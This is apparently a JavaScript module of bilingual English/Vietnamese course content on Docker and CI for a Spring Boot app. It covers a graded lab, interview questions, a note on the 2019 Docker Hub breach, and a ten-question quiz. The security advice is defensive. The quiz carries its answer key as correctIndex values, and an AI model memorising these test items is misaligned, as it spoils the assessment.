<p>On 25 April 2019 Docker discovered unauthorised access to a Docker Hub database holding data of about 190,000 accounts: usernames, hashed passwords, and the GitHub and Bitbucket tokens that Docker Hub used for automated builds. Docker revoked those tokens, which broke the autobuilds of many projects until owners reconnected them. The lesson for your pipeline: every integration you connect (registry, code host, CI, cloud) holds a credential to the next one. Give each the narrowest scope (<code>packages: write</code> only in the image job), prefer short-lived tokens (GitHub's <code>GITHUB_TOKEN</code>, OIDC to cloud providers) over personal access tokens, and know how to rotate each one in minutes.</p>

<h3>🎤 What the interviewer will ask (whole chapter)</h3>
<ol>
  <li><strong>"Walk me through your Dockerfile for Spring Boot."</strong> — Build stage with JDK and Maven, dependencies resolved before copying sources, cache mount for <code>~/.m2</code>; jar extracted into layers; runtime stage on a JRE, layers copied from rarely to often changing, non-root numeric user, exec-form entrypoint, <code>MaxRAMPercentage</code>. Numbers: one-line change ⇒ one 279 kB layer.</li>
  <li><strong>"How does configuration differ between dev, CI and production?"</strong> — Same image; values from the environment or mounted files; relaxed binding; explicit profile; secrets never in the image or repository; one database per environment.</li>
  <li><strong>"Your container restarts every few hours with exit 137."</strong> — Kernel OOM kill: compare heap settings with the limit, leave non-heap headroom, <code>ExitOnOutOfMemoryError</code>, measure real usage.</li>
  <li><strong>"What does your CI do, and how did you make it faster?"</strong> — Pipeline of 17.3; cache keyed on POMs (133.5 s ⇒ 68.8 s), and a thread dump that found 30 s lost at shutdown (⇒ 43.3 s). Mention that you measured.</li>
  <li><strong>"How would a new teammate run the whole system?"</strong> — Clone, create two secret files, <code>docker compose up -d --wait</code>: PostgreSQL, Redis and API healthy in about 23 s; only the API is published, on localhost.</li>
</ol>

<h3>🗂 Key terms</h3>
<ul>
  <li><strong>Grader / acceptance script</strong> — an automated check that runs the system the way a user or reviewer would.</li>
  <li><strong>Compose override file</strong> — a second file merged over the first; <code>!reset</code> removes a value, <code>!override</code> replaces it.</li>
  <li><strong>Token scope</strong> — what a credential is allowed to do; the smaller, the less a leak costs.</li>
</ul>

<h3>📌 Summary</h3>
<ul>
  <li>Starter "works on my machine": 1/10 — 448 MB of image content (<code>docker image inspect</code>; <code>docker image ls</code> counts disk usage, 1.34 GB in 17.1) with a 239 MB code layer, root, <code>.env</code> inside, no healthchecks, Redis on 0.0.0.0, secrets in <code>docker inspect</code>, unpinned actions.</li>
  <li>Reference solution, assembled only from this chapter's lessons: 10/10 in under a minute of grading.</li>
  <li>Make the grader itself safe: it must not open ports or leave containers behind.</li>
</ul>

<h3>Sources</h3>
<ul>
  <li>Docker, "Docker Hub incident" notice to users, 26 April 2019.</li>
  <li>All grading runs: this course's build machine, November 2026.</li>
</ul>
</div>
`;

const L175_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Bài 17.5 · Lab</span>
<h2>Lab chương 17 + câu hỏi phỏng vấn</h2>
<p class="lead">Nhóm SWP391 của bạn có một repo LabFlow "chạy được trên máy em": Dockerfile chép từ bài hướng dẫn, tệp compose đọc mật khẩu từ <code>.env</code>, Redis mở cổng "để em xem cho tiện", và một workflow CI viết trong năm phút. Việc của bạn là biến nó thành thứ giao được. Một script chấm chạy đúng những kiểm tra mà người review kinh nghiệm sẽ làm — trên bản sao sạch, từ số 0, với bí mật ngẫu nhiên — rồi in 10 dòng ĐẠT/TRƯỢT. Bản khởi đầu được 1/10 (đo ở dưới); lời giải mẫu được 10/10 (đang ẩn). Thời gian dự kiến: 2–3 giờ.</p>

<h3>Điểm xuất phát</h3>
${MA175_DF}
${MA175_COMPOSE}
${MA175_CI}

<h3>Hợp đồng (điều bộ chấm giả định)</h3>
<ul>
  <li><code>Dockerfile</code> và <code>compose.yaml</code> ở gốc dự án; compose có các service <code>db</code>, <code>redis</code>, <code>api</code>.</li>
  <li>Bí mật đọc từ <code>secrets/db_password.txt</code> và <code>secrets/jwt_secret.txt</code> (bộ chấm tự tạo với giá trị ngẫu nhiên; nó cũng ghi một tệp <code>.env</code>, vì bản khởi đầu cần — lời giải tốt thì bỏ qua tệp đó).</li>
  <li>API chỉ mở ở <code>127.0.0.1:\${LABFLOW_PORT:-8080}</code>; <code>/actuator/health</code> cho thấy thành phần <code>db</code> và <code>redis</code>.</li>
  <li>Workflow nằm ở <code>.github/workflows/ci.yml</code>.</li>
  <li>Mọi thứ khác bạn được đổi, kể cả mã LabFlow và <code>application.properties</code>.</li>
</ul>

<h3>Bộ chấm</h3>
<p>Nó chép dự án của bạn sang thư mục tạm, build bằng <code>docker compose</code> dưới tên project riêng, dựng mọi thứ từ số 0, và dọn sạch khi xong. Trong lúc chấm nó không bao giờ mở cổng ra ngoài: một tệp override gỡ mọi <code>ports</code> của <code>db</code>/<code>redis</code> và gắn API vào <code>127.0.0.1</code> — còn mục 7 thì đọc tệp compose <em>gốc</em> của bạn bằng <code>docker compose config</code>. (Tệp override đó có là vì phiên bản đầu của bộ chấm này đã thật sự mở Redis của bản khởi đầu ra <code>0.0.0.0:6379</code> trên máy dựng bài trong vài giây. Bộ chấm cũng đáng được cẩn thận như production.)</p>
${MA175_CHAM}
<p>Bản khởi đầu, chấm thật:</p>
${OUT175_STARTER}
<p>Để ý mục 5 của bản khởi đầu: <code>up --wait</code> "xong" sau 1 giây — không có healthcheck, compose chỉ chờ container <em>khởi động</em>, còn API thì chết vài giây sau khi thử nối <code>localhost:5432</code>. Vì vậy bộ chấm còn đòi API phải báo <code>healthy</code>. Và mục 1 đạt cũng chẳng nói lên mấy: build được là phần dễ.</p>

<h3>Các bước (mỗi bước chỉ tới bài có câu trả lời)</h3>
<ol>
  <li><strong>Image</strong> (mục 1–4): nhiều tầng, layered jar, nền JRE, <code>USER</code> với uid dạng số, <code>.dockerignore</code> — bài 17.1.</li>
  <li><strong>Cấu hình và bí mật</strong> (mục 6, 8): URL CSDL theo tên service, bí mật là tệp với <code>configtree</code> và <code>POSTGRES_PASSWORD_FILE</code>, hiện thành phần trong health — bài 17.2 và 17.4.</li>
  <li><strong>Khởi động và tắt</strong> (mục 5, 9): healthcheck cho cả ba service, <code>depends_on … service_healthy</code>, <code>ENTRYPOINT</code> dạng exec — bài 17.2 và 17.4.</li>
  <li><strong>Mạng</strong> (mục 7): không mở gì ngoài API trên <code>127.0.0.1</code> — bài 17.4.</li>
  <li><strong>CI</strong> (mục 10): <code>permissions</code> ở đầu tệp, mọi action ghim SHA 40 ký tự, qua actionlint — bài 17.3. Tự lấy SHA bằng <code>git ls-remote</code>; đừng chép từ chỗ nào bạn chưa kiểm.</li>
</ol>

<h3>Rubric</h3>
<table>
  <thead><tr><th>Phần</th><th>Mục</th><th>Điểm</th></tr></thead>
  <tbody>
    <tr><td>Image: build được, chia lớp và gọn, không root, không rác hay bí mật</td><td>1–4</td><td>4</td></tr>
    <tr><td>Cả hệ thống từ số 0, healthy, health cho thấy db + redis</td><td>5–6</td><td>2</td></tr>
    <tr><td>Không mở gì ra ngoài, không bí mật trong cấu hình container</td><td>7–8</td><td>2</td></tr>
    <tr><td>Tắt êm</td><td>9</td><td>1</td></tr>
    <tr><td>CI được gia cố và sạch lỗi lint</td><td>10</td><td>1</td></tr>
    <tr><td><em>Review (do đồng đội, không phải script)</em>: mục README "chạy bằng một lệnh", bí mật có hướng dẫn nhưng không commit, mô tả PR giải thích từng thay đổi</td><td>—</td><td>đạt/không đạt</td></tr>
  </tbody>
</table>

${giai('Xem lời giải mẫu (làm thử trước đã!)', `<p>Lời giải mẫu chính là các tệp đã dựng trong chương: Dockerfile và <code>.dockerignore</code> của 17.1 (thêm <code>secrets/</code> vào <code>.dockerignore</code>), tệp compose của 17.4 với cổng API viết thành <code>"127.0.0.1:\${LABFLOW_PORT:-8080}:8080"</code> và không đặt cứng tên <code>image:</code>, và workflow của 17.3. Mã LabFlow không cần đổi gì ngoài <code>spring.data.redis.timeout=500ms</code> (17.4). Chấm thật:</p>${OUT175_GIAI}<p>Nếu kẹt ở một mục: mục 2 trượt vì cỡ ⇒ xem có chép Maven hay JDK vào tầng cuối không; mục 4 trượt ⇒ <code>docker create</code> + <code>docker export | tar -t</code> cho thấy bên trong có gì; mục 5 trượt ⇒ <code>docker compose ps</code> và log của API; mục 9 ra exit 137 ⇒ PID 1 là một shell.</p>`)}

<h3>🕵️ Góc hacker — Docker Hub, 04/2019</h3>
<p>Ngày 25/04/2019, Docker phát hiện truy cập trái phép vào một CSDL của Docker Hub chứa dữ liệu khoảng 190 000 tài khoản: tên đăng nhập, mật khẩu đã băm, và token GitHub, Bitbucket mà Docker Hub dùng cho build tự động. Docker thu hồi các token đó, làm build tự động của nhiều dự án ngừng chạy tới khi chủ dự án kết nối lại. Bài học cho pipeline của bạn: mỗi tích hợp bạn nối vào (registry, nơi lưu mã, CI, cloud) đều giữ một chứng chỉ để vào cái kế tiếp. Cho mỗi cái phạm vi hẹp nhất (<code>packages: write</code> chỉ ở job image), ưu tiên token ngắn hạn (<code>GITHUB_TOKEN</code> của GitHub, OIDC sang nhà cung cấp cloud) hơn token truy cập cá nhân, và biết cách đổi từng cái trong vài phút.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi (cả chương)</h3>
<ol>
  <li><strong>"Trình bày Dockerfile Spring Boot của bạn."</strong> — Tầng build có JDK và Maven, tải thư viện trước khi chép mã nguồn, cache mount cho <code>~/.m2</code>; tách jar thành các lớp; tầng chạy trên JRE, chép lớp từ ít đổi tới hay đổi, user không root dạng số, entrypoint dạng exec, <code>MaxRAMPercentage</code>. Con số: sửa một dòng ⇒ một lớp 279 kB.</li>
  <li><strong>"Cấu hình khác nhau thế nào giữa dev, CI và production?"</strong> — Cùng một image; giá trị từ môi trường hoặc tệp gắn vào; relaxed binding; profile rõ ràng; bí mật không bao giờ trong image hay repo; mỗi môi trường một CSDL.</li>
  <li><strong>"Container của bạn cứ vài giờ khởi động lại với exit 137."</strong> — Kernel giết vì OOM: đối chiếu cấu hình heap với giới hạn, chừa chỗ cho phần ngoài heap, <code>ExitOnOutOfMemoryError</code>, đo mức dùng thật.</li>
  <li><strong>"CI của bạn làm gì, và bạn làm nó nhanh hơn thế nào?"</strong> — Pipeline của 17.3; cache khoá theo POM (133,5 giây ⇒ 68,8 giây), và một thread dump tìm ra 30 giây mất lúc tắt (⇒ 43,3 giây). Nhấn mạnh là bạn đã đo.</li>
  <li><strong>"Một đồng đội mới chạy cả hệ thống thế nào?"</strong> — Clone, tạo hai tệp bí mật, <code>docker compose up -d --wait</code>: PostgreSQL, Redis và API healthy trong khoảng 23 giây; chỉ API được mở, và chỉ trên localhost.</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
<ul>
  <li><strong>Bộ chấm / script nghiệm thu</strong> — kiểm tra tự động chạy hệ thống theo cách người dùng hay người review sẽ chạy.</li>
  <li><strong>Tệp override của Compose</strong> — tệp thứ hai được trộn đè lên tệp đầu; <code>!reset</code> xoá một giá trị, <code>!override</code> thay hẳn nó.</li>
  <li><strong>Phạm vi token (scope)</strong> — những gì một chứng chỉ được phép làm; càng hẹp thì lộ ra càng ít thiệt.</li>
</ul>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Bản "chạy được trên máy em": 1/10 — nội dung image 448 MB (<code>docker image inspect</code>; còn <code>docker image ls</code> tính dung lượng đĩa, 1,34 GB ở 17.1) với lớp mã 239 MB, root, có <code>.env</code> bên trong, không healthcheck, Redis trên 0.0.0.0, bí mật trong <code>docker inspect</code>, action không ghim.</li>
  <li>Lời giải mẫu, ráp chỉ từ các bài của chương: 10/10, chấm chưa tới một phút.</li>
  <li>Bản thân bộ chấm cũng phải an toàn: không được mở cổng, không được để container lại.</li>
</ul>

<h3>Nguồn</h3>
<ul>
  <li>Docker, thông báo "Docker Hub incident" gửi người dùng, 26/04/2019.</li>
  <li>Mọi lượt chấm: máy dựng bài của khoá, tháng 11/2026.</li>
</ul>
</div>
`;

const Q = (question, options, correctIndex) => ({ question, options, correctIndex, points: 1 });
const QUIZ17 = [
  Q('The naive Dockerfile does COPY . . and then mvn package. You change one line of Java and rebuild. What happens?|||Dockerfile ngây thơ làm COPY . . rồi mới mvn package. Bạn sửa một dòng Java rồi build lại. Chuyện gì xảy ra?', [
    'Only the changed class is recompiled; everything else comes from cache|||Chỉ lớp vừa sửa được biên dịch lại; mọi thứ khác lấy từ cache',
    'The COPY layer changes, so mvn package runs again and Maven re-downloads every dependency (104.7 s for LabFlow)|||Lớp COPY đổi, nên mvn package chạy lại và Maven tải lại mọi thư viện (LabFlow: 104,7 giây)',
    'Docker refuses to build because the context changed|||Docker từ chối build vì context đã đổi',
    'Only the CMD layer is rebuilt|||Chỉ lớp CMD được build lại',
  ], 1),
  Q('With the multi-stage layered Dockerfile, one string literal in a controller changes. How much new image data must be pushed?|||Với Dockerfile nhiều tầng chia lớp, một chuỗi trong controller đổi. Phải đẩy bao nhiêu dữ liệu image mới?', [
    'The whole 71.9 MB jar|||Cả jar 71,9 MB',
    'Nothing: Docker detects that the change is small|||Không gì: Docker tự biết thay đổi nhỏ',
    'One application layer of a few hundred kB (279 kB for LabFlow)|||Một lớp application vài trăm kB (LabFlow: 279 kB)',
    'The JRE base image again|||Lại cả image nền JRE',
  ], 2),
  Q('A Dockerfile does COPY .env /tmp/.env, uses it, then RUN rm /tmp/.env. Is the secret gone?|||Dockerfile làm COPY .env /tmp/.env, dùng xong thì RUN rm /tmp/.env. Bí mật đã mất chưa?', [
    'Yes, ls /tmp/.env fails in the container|||Rồi, ls /tmp/.env trong container báo không có',
    'No: the COPY layer still contains the file; docker save + tar recovers it|||Chưa: lớp của bước COPY vẫn chứa tệp; docker save + tar lấy lại được',
    'Only if the image is pushed to Docker Hub|||Chỉ khi image được đẩy lên Docker Hub',
    'Yes, because BuildKit squashes layers by default|||Rồi, vì BuildKit mặc định gộp lớp',
  ], 1),
  Q('A Spring Boot container runs with --memory 1g --cpus 2 and no JVM memory flags. What does the JVM choose?|||Container Spring Boot chạy với --memory 1g --cpus 2, không cờ bộ nhớ JVM nào. JVM chọn gì?', [
    'A 1 GB heap and G1|||Heap 1 GB và G1',
    'A heap of 25% of the host RAM|||Heap bằng 25% RAM máy chủ',
    'A 256 MB heap and SerialGC|||Heap 256 MB và SerialGC',
    'A 768 MB heap and ZGC|||Heap 768 MB và ZGC',
  ], 2),
  Q('java -Xmx3g runs in a container limited to 1 GB and keeps allocating. What do you see?|||java -Xmx3g chạy trong container giới hạn 1 GB và cứ xin thêm bộ nhớ. Bạn thấy gì?', [
    'OutOfMemoryError: Java heap space at 3 GB|||OutOfMemoryError: Java heap space ở mốc 3 GB',
    'The kernel kills the container: exit 137, OOMKilled=true, no Java error in the log|||Kernel giết container: exit 137, OOMKilled=true, log không có lỗi Java nào',
    'The container is paused until memory frees up|||Container bị tạm dừng tới khi bộ nhớ trống',
    'Docker raises the limit automatically|||Docker tự nâng giới hạn',
  ], 1),
  Q('LabFlow sets LABFLOW_DB_URL correctly, but someone also sets SPRING_DATASOURCE_URL=jdbc:postgresql://khong-co:5432/labflow. Result?|||LabFlow đặt LABFLOW_DB_URL đúng, nhưng có người đặt thêm SPRING_DATASOURCE_URL=jdbc:postgresql://khong-co:5432/labflow. Kết quả?', [
    'The application starts with the db URL from LABFLOW_DB_URL|||Ứng dụng lên với URL db từ LABFLOW_DB_URL',
    'Startup fails with UnknownHostException: khong-co — the environment variable overrides application.properties|||Khởi động hỏng với UnknownHostException: khong-co — biến môi trường ghi đè application.properties',
    'Spring picks one at random|||Spring chọn ngẫu nhiên một cái',
    'Spring refuses to start because two sources define the URL|||Spring từ chối khởi động vì hai nguồn cùng đặt URL',
  ], 1),
  Q('The image starts Java through start.sh that runs java without exec. docker stop is called during a 5-second request. What happens?|||Image khởi động Java qua start.sh gọi java mà không exec. docker stop được gọi giữa một request 5 giây. Chuyện gì xảy ra?', [
    'Spring finishes the request, then exits with 143|||Spring làm xong request rồi thoát với 143',
    'The shell (PID 1) does not pass SIGTERM to Java, Docker waits 10 s, then SIGKILL: exit 137 and no graceful shutdown|||Shell (PID 1) không chuyển SIGTERM cho Java, Docker chờ 10 giây rồi SIGKILL: exit 137, không tắt êm',
    'Docker sends SIGTERM to every process, so it is the same as exec form|||Docker gửi SIGTERM cho mọi tiến trình, nên giống dạng exec',
    'The container cannot be stopped|||Không dừng được container',
  ], 1),
  Q('Redis is stopped while LabFlow runs. Which statement matches what was measured?|||Redis bị dừng khi LabFlow đang chạy. Câu nào đúng với số đo?', [
    '/actuator/health/readiness turns DOWN and Docker restarts the API|||/actuator/health/readiness thành DOWN và Docker khởi động lại API',
    '/actuator/health is DOWN (503), readiness stays UP (200), the container stays healthy|||/actuator/health thành DOWN (503), readiness vẫn UP (200), container vẫn healthy',
    'Both are UP because Redis is only a cache|||Cả hai đều UP vì Redis chỉ là cache',
    'The API exits immediately|||API thoát ngay lập tức',
  ], 1),
  Q('Why does LabFlow pin actions as actions/checkout@3d3c42e… # v7.0.1 instead of @v7?|||Vì sao LabFlow ghim action dạng actions/checkout@3d3c42e… # v7.0.1 thay vì @v7?', [
    'SHAs make the workflow run faster|||SHA làm workflow chạy nhanh hơn',
    'Tags can be moved to another commit (tj-actions/changed-files, March 2025); a commit SHA cannot|||Tag có thể bị dời sang commit khác (tj-actions/changed-files, 03/2025); SHA của commit thì không',
    'GitHub no longer supports tags|||GitHub không còn hỗ trợ tag',
    'Dependabot cannot update tags|||Dependabot không cập nhật được tag',
  ], 1),
  Q('In compose.yaml, Redis has no "ports:" entry. What does that mean?|||Trong compose.yaml, Redis không có mục "ports:". Điều đó nghĩa là gì?', [
    'The API cannot reach Redis|||API không gọi được Redis',
    'Redis is reachable only by services on the compose network (as host "redis"), not from outside the machine|||Chỉ các service trong mạng compose gọi được Redis (host "redis"), bên ngoài máy thì không',
    'Redis listens on 0.0.0.0:6379 on the host|||Redis nghe ở 0.0.0.0:6379 trên máy chủ',
    'Compose picks a random host port|||Compose chọn ngẫu nhiên một cổng trên máy chủ',
  ], 1),
];

const L = (n, slug, en, vi, description, content) => ({
  title: `17.${n} — ${en}|||17.${n} — ${vi}`, slug, type: 'LESSON', isFreePreview: false, description, content,
});

export default {
  title: 'Chapter 17 — Docker and CI|||Chương 17 — Docker và CI',
  description: 'Đóng gói và tự động kiểm tra LabFlow như một nhóm làm thật: ba kiểu Dockerfile đo cỡ, thời gian build lại và lớp phải đẩy; bí mật lọt qua lớp image và secret mount; JVM trong giới hạn bộ nhớ, cấu hình từ môi trường, healthcheck, PID 1 và tắt êm; pipeline GitHub Actions ghim SHA, Testcontainers, registry và digest; compose PostgreSQL + Redis + API bằng một lệnh; lab có bộ chấm 10 mục.',
  lessons: [
    L(1, 'sb-17-1-dockerfile-spring', 'A Dockerfile for a Spring Boot app', 'Dockerfile cho ứng dụng Spring Boot',
      'Ba Dockerfile cho cùng LabFlow, đo thật: bản ngây thơ 1,34 GB chạy root, mang theo .env và .git, sửa một dòng build lại 104,7 giây; fat jar đẩy 71,9 MB mỗi lần; nhiều tầng + layered jar chỉ đổi một lớp 279 kB, uid 10001; sửa chú thích không đổi lớp nào; .dockerignore; bí mật "đã xoá" lấy lại bằng docker save, --build-arg nằm trong history, secret mount; Buildpacks không shell, build lặp lại được; CVE-2019-5736, nghiên cứu RWTH 2023.',
      L171_EN + L171_VI),
    L(2, 'sb-17-2-application-properties-docker', 'Configuration for containers', 'Cấu hình cho môi trường container',
      'Một image, cấu hình từ môi trường: localhost trong container, relaxed binding và thứ tự nguồn (dòng lệnh > biến môi trường > tệp), lỗi Flyway khi quên profile; liveness/readiness, Redis sập ⇒ health 503 nhưng readiness 200; JVM trong 1 GB chỉ lấy heap 256 MB và SerialGC, -Xmx3g ⇒ kernel giết 137, MaxRAMPercentage ⇒ lỗi rõ ràng; PID 1: dạng exec tắt êm 143, script thiếu exec ⇒ 137 sau 10 giây; bí mật qua tệp với configtree; Toyota T-Connect 2022.',
      L172_EN + L172_VI),
    L(3, 'sb-17-3-github-actions-spring', 'CI with GitHub Actions', 'CI với GitHub Actions',
      'Workflow từng dòng: quyền tối thiểu, concurrency, action ghim SHA, cache Maven, Testcontainers trên runner, image gắn tag commit; runner dựng lại đo được: lạnh 133,5 giây, ấm 68,8 giây, thread dump tìm ra 30 giây mất lúc tắt (Spring Modulith chờ CSDL đã dừng) ⇒ 43,3 giây; PR đổi luật bị test chặn; tag latest bị dời, deploy bằng digest; Dependabot; actionlint bắt chèn lệnh nhưng không bắt pull_request_target; tj-actions 2025.',
      L173_EN + L173_VI),
    L(4, 'sb-17-4-checkpoint-9', 'Checkpoint: the whole stack with one command', 'Checkpoint: cả hệ thống chạy bằng một lệnh',
      'Compose PostgreSQL + Redis + API từ số 0 trong 22,8 giây: thứ tự theo healthcheck, bí mật là tệp, chỉ API mở ra 127.0.0.1, mọi service có giới hạn; cache Redis 18 ms so với 264 ms; Redis chết ⇒ request treo 60 giây vì thời hạn mặc định của Lettuce, spring.data.redis.timeout=500ms ⇒ 0,5 giây, CacheErrorHandler giữ câu trả lời đúng; volume còn sau down; Redis trong Testcontainers; P2PInfect 2023.',
      L174_EN + L174_VI),
    L(5, 'sb-17-5-lab-17', 'Chapter 17 lab + interview questions', 'Lab chương 17 + câu hỏi phỏng vấn',
      'Lab có bộ chấm 10 mục chạy thật: biến bản "chạy được trên máy em" của nhóm (Dockerfile ngây thơ, compose đọc .env, Redis mở cổng, workflow không ghim) thành bản giao được — image chia lớp không root không bí mật, compose lên từ số 0 có health db/redis, tắt êm, CI ghim SHA qua actionlint; bản khởi đầu và lời giải được chấm thật, lời giải ẩn; rubric và câu phỏng vấn cả chương.',
      L175_EN + L175_VI),
    {
      title: '17.6 — Chapter 17 quiz|||17.6 — Kiểm tra chương 17',
      slug: 'sb-17-6-quiz',
      type: 'QUIZ',
      isFreePreview: false,
      description: 'Mười câu về những gì đã chạy thật trong chương: build lại sau một dòng sửa, lớp 279 kB, bí mật còn trong lớp image, heap 256 MB trong container 1 GB, exit 137 khi -Xmx vượt giới hạn, biến môi trường ghi đè tệp cấu hình, PID 1 là shell, health và readiness khi Redis sập, ghim action bằng SHA, Redis không mở cổng.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Quiz</span>
<h2>Check what stuck</h2>
<p class="lead">Every answer is something that ran in this chapter — a 1.34 GB image, a 279 kB layer, a password recovered from a deleted file, a container killed with 137, a stop signal that never reached Java, a request that hung for 60 seconds. Pass mark 7/10.</p>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Kiểm tra</span>
<h2>Xem thử đọng lại được gì</h2>
<p class="lead">Đáp án nào cũng là thứ đã chạy trong chương — một image 1,34 GB, một lớp 279 kB, một mật khẩu lấy lại từ tệp đã xoá, một container bị giết với mã 137, một tín hiệu dừng không bao giờ tới được Java, một request treo 60 giây. Đạt từ 7/10.</p>
</div>
`,
      quiz: { timeLimitSeconds: 900, questions: QUIZ17 },
    },
  ],
};
